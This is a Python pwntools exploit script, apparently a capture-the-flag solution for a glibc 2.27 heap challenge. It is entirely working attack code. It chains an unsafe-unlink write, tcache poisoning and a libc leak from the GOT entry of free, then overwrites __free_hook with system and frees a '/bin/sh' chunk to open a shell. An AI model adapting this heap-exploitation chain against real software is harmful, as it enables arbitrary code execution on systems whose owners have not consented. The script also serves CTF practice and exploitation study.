from parse_args_and_some_func import *

sh:tube = all_parsed_args['io']

context.arch="amd64"

if all_parsed_args["debug_enable"]:
    libc = sh.elf.libc
else:
    libc = ELF('/root/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')


def ma(idx, size, data) -> int:
    assert idx > -1 and idx < 0x21, "idx error!"
    assert size > 0x7f and idx < 0x101, "size error!"
    sh.sendlineafter("4.show\n", "1")
    sh.sendlineafter("index:\n", str(idx))
    sh.sendlineafter("size:\n", str(size))
    gift = sh.recvline()
    info("msg recv:{}".format(gift))
    leak_addr = int16(gift[6:-1].decode())
    info("leak addr:0x%x" % leak_addr)
    sh.sendafter("content:\n", data)
    return leak_addr
    

def fr(idx):
    sh.sendlineafter("4.show\n", "2")
    sh.sendlineafter("index:\n", str(idx))


edit_flag = 0
def ed(idx, data):
    global edit_flag
    assert edit_flag != 2, "cannot edit!"
    sh.sendlineafter("4.show\n", "3")
    sh.sendlineafter("index:\n", str(idx))
    sh.sendafter("content:\n", data)


def show(idx):
    sh.sendlineafter("4.show\n", "4")
    sh.sendlineafter("index:\n", str(idx))
    msg = sh.recvline()
    info("msg recv:{}".format(msg))
    return msg

for i in range(7):
    ma(i, 0xf0, '{}'.format(i) * 0xf0)

leak_addr = ma(7, 0x88, "a")
LOG_ADDR("leak_heap_addr", leak_addr) # 0x9f0960

ma(8, 0xf0, "b")
ma(9, 0x80, "c")
ma(0xa, 0x80, "d")
ma(0xb, 0x80, "/bin/sh\x00")

for i in range(7):
    fr(i)

# unlink
target_addr = 0x602118

layout = [0, 0x81, target_addr - 0x18, target_addr - 0x10, "a" * 0x60, 0x80]
ed(7, flat(layout))

fr(8)

free_got = 0x601fa0
layout = [leak_addr + 0x190, leak_addr + 0x190, free_got, 0x602100]
ed(7, flat(layout))

fr(4)
fr(5)

# tcache bin attack
ma(0, 0x80, p64(0x6022b8))
ma(1, 0x80, "a")
ma(4, 0x80, "a" * 8) # change key2

# leak libc addr
msg = show(6)
free_addr = u64(msg[:-1].ljust(8, b"\x00"))
LOG_ADDR("free_addr", free_addr)

libc.address = free_addr - 0x97950
LOG_ADDR("libc_base_addr", libc.address)

# edit __free_hook to system-addr
layout = [[libc.sym['__free_hook']] * 3, 0x602100]
ed(7, flat(layout))

ed(4, p64(libc.sym['system']))

# free /bin/sh chunk to get shell
fr(0xb)

sh.interactive()